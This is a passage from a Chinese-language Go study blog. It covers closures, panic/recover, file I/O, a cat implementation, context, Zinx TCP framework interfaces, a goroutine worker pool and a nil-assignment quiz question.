href="#【问题】Go语言闭包【让闭包函数拥有一个初始状态，记住了创建时所在的环境，各种变量的值，减少全局变量的使用，在栈区方便回收】" class="headerlink" title="【问题】Go语言闭包【让闭包函数拥有一个初始状态，记住了创建时所在的环境，各种变量的值，减少全局变量的使用，在栈区方便回收】"></a>【问题】Go语言闭包【让闭包函数拥有一个初始状态，记住了创建时所在的环境，各种变量的值，减少全局变量的使用，在栈区方便回收】</h2><p>简单来说，闭包允许一个函数记住并访问了它创建时所在的环境，即使在这个函数在其他地方被调用时仍然可以使用这个环境中的变量</p><ul><li>闭包用来减少全局变量，在函数调用过程中隐式传递共享变量</li><li>编译器检测到闭包，将外部变量分配到堆上</li><li>下面的程序中，a分配在堆上</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fn</span><span class="params">(a <span class="keyword">int</span>)</span> <span class="title">func</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(i <span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</span><br><span class="line">fmt.Println(a)</span><br><span class="line">a = a + i</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">f:= fn(<span class="number">3</span>)</span><br><span class="line">g:= fn(<span class="number">3</span>)</span><br><span class="line">f(<span class="number">1</span>) <span class="comment">//输出 4</span></span><br><span class="line">f(<span class="number">1</span>) <span class="comment">//输出 5</span></span><br><span class="line">g(<span class="number">1</span>) <span class="comment">//输出 4</span></span><br><span class="line">g(<span class="number">1</span>) <span class="comment">//输出 5</span></span><br></pre></td></tr></table></figure><h2 id="panic和recover"><a href="#panic和recover" class="headerlink" title="panic和recover"></a>panic和recover</h2><p>函数签名</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">panic</span>(i <span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line"><span class="built_in">recover</span>() <span class="keyword">interface</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="主动调用-抛出panic"><a href="#主动调用-抛出panic" class="headerlink" title="主动调用/抛出panic"></a>主动调用/抛出panic</h3><ol><li>主动调用panic结束程序运行</li><li>调试时用panic快速退出，并打印出来堆栈信息</li><li>需要主动在程序分支流程上调用recover拦截错误</li></ol><h2 id="标准库"><a href="#标准库" class="headerlink" title="标准库"></a>标准库</h2><h3 id="IO操作"><a href="#IO操作" class="headerlink" title="IO操作"></a>IO操作</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">os.Stdin：标准输入的文件实例，类型为*File</span><br><span class="line">os.Stdout：标准输出的文件实例，类型为*File</span><br><span class="line">os.Stderr：标准错误输出的文件实例，类型为*File</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Create</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(file *File, err Error)</span></span></span><br><span class="line"><span class="function">//根据提供的文件名创建新的文件，返回一个文件对象，默认权限是0666</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">NewFile</span><span class="params">(fd <span class="keyword">uintptr</span>, name <span class="keyword">string</span>)</span> *<span class="title">File</span></span></span><br><span class="line"><span class="function">// 根据文件描述符创建相应的文件，返回一个文件对象</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Open</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="params">(file *File, err Error)</span></span></span><br><span class="line"><span class="function">// 只读方式打开一个名称为<span class="title">name</span>的文件</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">OpenFile</span><span class="params">(name <span class="keyword">string</span>, flag <span class="keyword">int</span>, perm <span class="keyword">uint32</span>)</span> <span class="params">(file *File, err Error)</span></span></span><br><span class="line"><span class="function">// 打开名称为<span class="title">name</span>的文件，<span class="title">flag</span>是打开的方式，只读、读写等，<span class="title">perm</span>是权限</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(file *File)</span> <span class="title">Write</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err Error)</span></span></span><br><span class="line"><span class="function">写入<span class="title">byte</span>类型的信息到文件</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(file *File)</span> <span class="title">WriteAt</span><span class="params">(b []<span class="keyword">byte</span>, off <span class="keyword">int64</span>)</span> <span class="params">(n <span class="keyword">int</span>, err Error)</span></span></span><br><span class="line"><span class="function">在指定位置开始写入<span class="title">byte</span>类型的信息</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(file *File)</span> <span class="title">WriteString</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="params">(ret <span class="keyword">int</span>, err Error)</span></span></span><br><span class="line"><span class="function">写入<span class="title">string</span>信息到文件</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(file *File)</span> <span class="title">Read</span><span class="params">(b []<span class="keyword">byte</span>)</span> <span class="params">(n <span class="keyword">int</span>, err Error)</span></span></span><br><span class="line"><span class="function">读取数据到<span class="title">b</span>中</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(file *File)</span> <span class="title">ReadAt</span><span class="params">(b []<span class="keyword">byte</span>, off <span class="keyword">int64</span>)</span> <span class="params">(n <span class="keyword">int</span>, err Error)</span></span></span><br><span class="line"><span class="function">从<span class="title">off</span>开始读取数据到<span class="title">b</span>中</span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Remove</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">Error</span></span></span><br><span class="line"><span class="function">删除文件名为<span class="title">name</span>的文件</span></span><br><span class="line"><span class="function"></span></span><br><span class="line">logFile, err := os.OpenFile("./xx.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)</span><br></pre></td></tr></table></figure><h3 id="实现一个cat命令"><a href="#实现一个cat命令" class="headerlink" title="实现一个cat命令"></a>实现一个cat命令</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cat命令实现</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">cat</span><span class="params">(r *bufio.Reader)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        buf, err := r.ReadBytes(<span class="string">'\n'</span>) <span class="comment">//注意是字符</span></span><br><span class="line">        <span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Fprintf(os.Stdout, <span class="string">"%s"</span>, buf)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    flag.Parse() <span class="comment">// 解析命令行参数</span></span><br><span class="line">    <span class="keyword">if</span> flag.NArg() == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="comment">// 如果没有参数默认从标准输入读取内容</span></span><br><span class="line">        cat(bufio.NewReader(os.Stdin))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 依次读取每个指定文件的内容并打印到终端</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; flag.NArg(); i++ &#123;</span><br><span class="line">        f, err := os.Open(flag.Arg(i))</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            fmt.Fprintf(os.Stdout, <span class="string">"reading from %s failed, err:%v\n"</span>, flag.Arg(i), err)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        cat(bufio.NewReader(f))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="net包"><a href="#net包" class="headerlink" title="net包"></a>net包</h2><h2 id="context包"><a href="#context包" class="headerlink" title="context包"></a>context包</h2><p>当一个请求被取消或超时时，所有用来处理该请求的 goroutine 都应该迅速退出，然后系统才能释放这些 goroutine 占用的资源。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始的例子</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        fmt.Println(<span class="string">"worker"</span>)</span><br><span class="line">        time.Sleep(time.Second)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如何接收外部命令实现退出</span></span><br><span class="line">    wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    wg.Add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> worker()</span><br><span class="line">    <span class="comment">// 如何优雅的实现结束子goroutine</span></span><br><span class="line">    wg.Wait()</span><br><span class="line">    fmt.Println(<span class="string">"over"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Zinx"><a href="#Zinx" class="headerlink" title="Zinx"></a>Zinx</h2><h3 id="ziface"><a href="#ziface" class="headerlink" title="ziface"></a><strong>ziface</strong></h3><p>  接口包括</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">- IService 基础服务的启动</span><br><span class="line">  - Start() <span class="comment">//启动服务器</span></span><br><span class="line">  - Stop()  <span class="comment">//停止服务器</span></span><br><span class="line">  - Serve() <span class="comment">//开启业务服务方法</span></span><br><span class="line">  - AddRouter(router IRouter)<span class="comment">//路由功能：给当前服务注册一个路由业务方法，供客户端链接处理使用</span></span><br><span class="line">- IConnection 基于net库</span><br><span class="line">  - Start() <span class="comment">//启动连接，让当前连接开始工作</span></span><br><span class="line">  - Stop()  <span class="comment">//停止连接，结束当前连接状态M</span></span><br><span class="line">  - GetTCPConnection() * net.TCPConn <span class="comment">//从当前连接获取原始的socket TCPConn</span></span><br><span class="line">  - GetConnID() <span class="keyword">uint32</span>    <span class="comment">//获取当前连接ID</span></span><br><span class="line">  - RemoteAddr() net.Addr <span class="comment">//获取远程客户端地址信息</span></span><br><span class="line"></span><br><span class="line">  - <span class="keyword">type</span> HandFunc <span class="function"><span class="keyword">func</span><span class="params">(*net.TCPConn, []<span class="keyword">byte</span>, <span class="keyword">int</span>)</span> <span class="title">error</span> //定义一个统一处理链接业务的接口,是所有<span class="title">conn</span>链接在处理业务的函数接口，第一参数是<span class="title">socket</span>原生链接，第二个参数是客户端请求的数据，第三个参数是客户端请求的数据长度。这样，如果我们想要指定一个<span class="title">conn</span>的处理业务，只要定义一个<span class="title">HandFunc</span>类型的函数，然后和该链接绑定就可以了。</span></span><br><span class="line"><span class="function">- <span class="title">IRequest</span> //每次客户端的全部请求数据，一起放到一个<span class="title">Request</span>结构体里</span></span><br><span class="line"><span class="function">  - <span class="title">GetConnection</span><span class="params">()</span> <span class="title">IConnection</span>    //获取请求连接信息</span></span><br><span class="line"><span class="function">  - <span class="title">GetData</span><span class="params">()</span> []<span class="title">byte</span>            //获取请求消息的数据</span></span><br><span class="line"><span class="function">- <span class="title">IRouter</span>  //路由配置类</span></span><br><span class="line"><span class="function">  - <span class="title">PreHandle</span><span class="params">(request IRequest)</span>  //在处理<span class="title">conn</span>业务之前的钩子方法</span></span><br><span class="line"><span class="function">  - <span class="title">Handle</span><span class="params">(request IRequest)</span>     //处理<span class="title">conn</span>业务的方法</span></span><br><span class="line"><span class="function">  - <span class="title">PostHandle</span><span class="params">(request IRequest)</span> //处理<span class="title">conn</span>业务之后的钩子方法</span></span><br><span class="line"><span class="function">- <span class="title">IMessage</span> //消息封装</span></span><br><span class="line"><span class="function">  - <span class="title">GetDataLen</span><span class="params">()</span> <span class="title">uint32</span> //获取消息数据段长度</span></span><br><span class="line"><span class="function">  - <span class="title">GetMsgId</span><span class="params">()</span> <span class="title">uint32</span>   //获取消息<span class="title">ID</span></span></span><br><span class="line"><span class="function">  - <span class="title">GetData</span><span class="params">()</span> []<span class="title">byte</span>    //获取消息内容</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  - <span class="title">SetMsgId</span><span class="params">(<span class="keyword">uint32</span>)</span>    //设计消息<span class="title">ID</span></span></span><br><span class="line"><span class="function">  - <span class="title">SetData</span><span class="params">([]<span class="keyword">byte</span>)</span>     //设计消息内容</span></span><br><span class="line"><span class="function">  - <span class="title">SetDataLen</span><span class="params">(<span class="keyword">uint32</span>)</span>  //设置消息数据段长度</span></span><br><span class="line"><span class="function">- <span class="title">IDataPack</span> //消息封包拆包</span></span><br><span class="line"><span class="function">  - <span class="title">GetHeadLen</span><span class="params">()</span> <span class="title">uint32</span>                  //获取包头长度方法</span></span><br><span class="line"><span class="function">  - <span class="title">Pack</span><span class="params">(msg IMessage)</span><span class="params">([]<span class="keyword">byte</span>, error)</span>   //封包方法</span></span><br><span class="line"><span class="function">    // 通过<span class="title">encoding</span>/<span class="title">binary</span>.<span class="title">write</span>方法将<span class="title">byte</span>数组小端写入<span class="title">bytes</span>来压缩数据</span></span><br><span class="line"><span class="function">  - <span class="title">Unpack</span><span class="params">([]<span class="keyword">byte</span>)</span><span class="params">(IMessage, error)</span>     //拆包方法</span></span><br><span class="line"><span class="function">- <span class="title">IMsgHandle</span> //消息管理模块</span></span><br><span class="line"><span class="function">  - <span class="title">DoMsgHandler</span><span class="params">(request IRequest)</span>          //马上以非阻塞方式处理消息</span></span><br><span class="line"><span class="function">  - <span class="title">AddRouter</span><span class="params">(msgId <span class="keyword">uint32</span>, router IRouter)</span> //为消息添加具体的处理逻辑</span></span><br><span class="line"><span class="function">  - <span class="title">StartWorkerPool</span><span class="params">()</span>                       //启动<span class="title">worker</span>工作池</span></span><br><span class="line"><span class="function">  - <span class="title">SendMsgToTaskQueue</span><span class="params">(request IRequest)</span>    //将消息交给<span class="title">MsgHandle</span>的消息队列<span class="title">TaskQueue</span>,由<span class="title">worker</span>进行处理</span></span><br><span class="line"><span class="function">- <span class="title">IConnManager</span> // <span class="title">TCP</span>的链接管理模块</span></span><br><span class="line"><span class="function">  - <span class="title">Add</span><span class="params">(conn IConnection)</span>                   //添加链接</span></span><br><span class="line"><span class="function">  - <span class="title">Remove</span><span class="params">(conn IConnection)</span>                //删除连接</span></span><br><span class="line"><span class="function">  - <span class="title">Get</span><span class="params">(connID <span class="keyword">uint32</span>)</span> <span class="params">(IConnection, error)</span> //利用<span class="title">ConnID</span>获取链接</span></span><br><span class="line"><span class="function">  - <span class="title">Len</span><span class="params">()</span> <span class="title">int</span>                               //获取当前连接</span></span><br><span class="line"><span class="function">  - <span class="title">ClearConn</span><span class="params">()</span>                             //删除并停止所有链接</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Job <span class="keyword">struct</span> &#123;</span><br><span class="line">    id <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Worker <span class="keyword">struct</span> &#123;</span><br><span class="line">    id         <span class="keyword">int</span></span><br><span class="line">    jobChannel <span class="keyword">chan</span> Job</span><br><span class="line">    quit       <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Pool <span class="keyword">struct</span> &#123;</span><br><span class="line">    workerCount <span class="keyword">int</span></span><br><span class="line">    jobChannel  <span class="keyword">chan</span> Job</span><br><span class="line">    workers     []Worker</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewJob</span><span class="params">(id <span class="keyword">int</span>)</span> <span class="title">Job</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Job&#123;id: id&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWorker</span><span class="params">(id <span class="keyword">int</span>, jobChannel <span class="keyword">chan</span> Job)</span> <span class="title">Worker</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Worker&#123;</span><br><span class="line">        id:         id,</span><br><span class="line">        jobChannel: jobChannel,</span><br><span class="line">        quit:       <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewPool</span><span class="params">(workerCount, jobCount <span class="keyword">int</span>)</span> <span class="title">Pool</span></span> &#123;</span><br><span class="line">    jobChannel := <span class="built_in">make</span>(<span class="keyword">chan</span> Job, jobCount)</span><br><span class="line">    workers := <span class="built_in">make</span>([]Worker, workerCount)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; workerCount; i++ &#123;</span><br><span class="line">        workers[i] = NewWorker(i, jobChannel)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Pool&#123;</span><br><span class="line">        workerCount: workerCount,</span><br><span class="line">        jobChannel:  jobChannel,</span><br><span class="line">        workers:     workers,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w Worker)</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> job := &lt;-w.jobChannel:</span><br><span class="line">                fmt.Printf(<span class="string">"Worker %d processing job %d\n"</span>, w.id, job.id)</span><br><span class="line">            <span class="keyword">case</span> &lt;-w.quit:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w Worker)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        w.quit &lt;- <span class="literal">true</span></span><br><span class="line">    &#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Pool)</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; p.workerCount; i++ &#123;</span><br><span class="line">        p.workers[i].Start()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Pool)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; p.workerCount; i++ &#123;</span><br><span class="line">        p.workers[i].Stop()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Pool)</span> <span class="title">AddJob</span><span class="params">(job Job)</span></span> &#123;</span><br><span class="line">    p.jobChannel &lt;- job</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    pool := NewPool(<span class="number">3</span>, <span class="number">10</span>)</span><br><span class="line">    pool.Start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">        job := NewJob(i)</span><br><span class="line">        pool.AddJob(job)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 等待一段时间，以便观察协程池的工作</span></span><br><span class="line">    <span class="comment">// 在实际应用中，你可能需要使用 sync.WaitGroup 或其他同步方法来确保所有任务完成后再关闭协程池</span></span><br><span class="line">    <span class="comment">// 这里仅做演示，实际中请根据需要进行调整</span></span><br><span class="line">    fmt.Println(<span class="string">"等待一段时间，以观察协程池的工作..."</span>)</span><br><span class="line">    <span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p><code>Job</code> 结构体:</p><ul><li><code>id int</code>: 用于表示一个任务的唯一标识。</li></ul></li><li><p><code>Worker</code> 结构体:</p><ul><li><code>id int</code>: 表示工作者的唯一标识。</li><li><code>jobChannel chan Job</code>: 是一个任务通道，用于接收工作者执行的任务。</li><li><code>quit chan bool</code>: 是一个退出通道，用于通知工作者停止运行。</li></ul></li><li><p><code>Pool</code> 结构体:</p><ul><li><code>workerCount int</code>: 表示协程池中的工作者数量。</li><li><code>jobChannel chan Job</code>: 是一个任务通道，用于向协程池中添加任务。</li><li><code>workers []Worker</code>: 存储了所有的工作者。</li></ul></li></ol><h3 id="方法解析："><a href="#方法解析：" class="headerlink" title="方法解析："></a>方法解析：</h3><ol><li><p><code>NewJob(id int) Job</code>:</p><ul><li>返回一个新的任务 <code>Job</code> 对象，带有指定的任务ID。</li></ul></li><li><p><code>NewWorker(id int, jobChannel chan Job) Worker</code>:</p><ul><li>返回一个新的工作者 <code>Worker</code> 对象，使用指定的工作者ID和任务通道。</li></ul></li><li><p><code>NewPool(workerCount, jobCount int) Pool</code>:</p><ul><li>创建一个新的协程池，初始化了工作者和任务通道。</li><li>参数 <code>workerCount</code> 表示协程池中的工作者数量。</li><li>参数 <code>jobCount</code> 表示任务通道的缓冲区大小。</li></ul></li><li><p><code>Worker.Start()</code>:</p><ul><li>启动了一个工作者协程，该协程会不断地监听任务通道和退出通道。</li><li>当从任务通道收到任务时，工作者会执行任务；当从退出通道收到信号时，工作者会停止运行。</li></ul></li><li><p><code>Worker.Stop()</code>:</p><ul><li>启动了一个协程，向退出通道发送信号，通知工作者停止运行。</li></ul></li><li><p><code>Pool.Start()</code>:</p><ul><li>启动了协程池中所有工作者。</li></ul></li><li><p><code>Pool.Stop()</code>:</p><ul><li>停止协程池中所有工作者。</li></ul></li><li><p><code>Pool.AddJob(job Job)</code>:</p><ul><li>向任务通道中添加一个任务。</li></ul></li></ol><h3 id="主函数-main-解析："><a href="#主函数-main-解析：" class="headerlink" title="主函数 main 解析："></a>主函数 <code>main</code> 解析：</h3><ol><li><p>创建一个协程池 <code>pool</code>，包括了 3 个工作者和 10 个任务的通道缓冲区。</p></li><li><p>调用 <code>pool.Start()</code> 启动所有工作者。</p></li><li><p>循环创建了 5 个任务，每个任务被添加到协程池的任务通道中。</p></li><li><p>由于在主函数结束后，主协程也会结束，所以在这里使用了 <code>select{}</code> 语句使主协程保持活跃状态。</p></li></ol><h3 id="运行流程："><a href="#运行流程：" class="headerlink" title="运行流程："></a>运行流程：</h3><ol><li><p>在主函数中创建了一个协程池 <code>pool</code>，初始化了 3 个工作者和一个任务通道。</p></li><li><p>每个工作者通过 <code>Worker.Start()</code> 方法启动了一个独立的协程，开始监听任务通道和退出通道。</p></li><li><p>主函数循环创建了 5 个任务，并通过 <code>pool.AddJob(job)</code> 方法将它们添加到协程池的任务通道中。</p></li><li><p>每个工作者从任务通道中接收到任务后，会执行相应的任务。</p></li><li><p>当主函数结束后，通过 <code>select{}</code> 语句使主协程保持活跃状态，保证所有工作者有足够的时间来处理任务。</p></li></ol><p>请注意，实际应用中，你可能需要使用合适的同步机制（例如 <code>sync.WaitGroup</code>）来确保所有任务完成后再关闭协程池，以及处理一些错误和异常情况。</p><h2 id="3-下面赋值正确的是"><a href="#3-下面赋值正确的是" class="headerlink" title="3.下面赋值正确的是()"></a>3.下面赋值正确的是()</h2><p>A. var x = nil<br>B. var x interface{} = nil<br>C. var x string = nil<br>D. var x error = nil<br>参考答案及解析：BD。知识点：nil 值。nil 只能赋值给指针、chan、func、interface、map 或 slice 类型的变量。强调下 D 选项的 error 类型，它是一种内置接口类型，看下方贴出的源码就知道，所以 D 是对的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> error <span 